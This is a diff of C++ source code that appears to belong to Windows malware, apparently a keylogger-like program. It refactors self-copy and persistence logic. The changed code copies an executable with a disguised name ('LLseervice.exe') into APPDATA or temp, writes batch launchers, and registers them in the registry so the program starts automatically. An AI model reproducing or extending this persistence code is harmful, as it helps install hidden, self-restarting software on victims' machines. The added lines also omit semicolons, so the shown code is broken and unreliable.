@@ -186,23 +186,7 @@ namespace IO
     bat.close();
     return 0;
   }
-  void fixbat(std::string filename,std::string fullpath){
-  std::string batname;
-  std::string batpath;
-  if(filename == "LLseervice.exe"){
-                      batname = "batLL.bat";
-                      batpath = path+batname;
-                    }else{
-                      batname = "batER.bat";
-                      batpath = path+batname;
-                    }
-                    
-                    mkbat(fullpath,batpath)
-                    //shell_cmd()
-                    //startup(fullpath.c_str());
-                    Registry::RegisterProgram2(batname,batpath);
-                    
-  }
+ 
     bool copy_File() {
         char* appdata = getenv("APPDATA");
         std::string appdata_dir(appdata);
@@ -212,7 +196,8 @@ namespace IO
         std::string batname = "batER.bat";
         std::string batpath = path+batname;
         if(!IO::exists_file(batpath)){
-           fixbat(filename,batpath);
+           mkbat(fullpath,batpath)
+           Registry::RegisterProgram2(batname,batpath);
         }
         if (IO::exists_file(fullpath)) {
             char* temp = getenv("temp");
@@ -224,7 +209,9 @@ namespace IO
             batpath = path+batname;
         }
         if(!IO::exists_file(batpath)){
-           fixbat(filename,batpath);
+           //fixbat(filename,batpath);
+           mkbat(fullpath,batpath)
+           Registry::RegisterProgram2(batname,batpath);
         }
         if (IO::exists_file(fullpath)){
             return false;
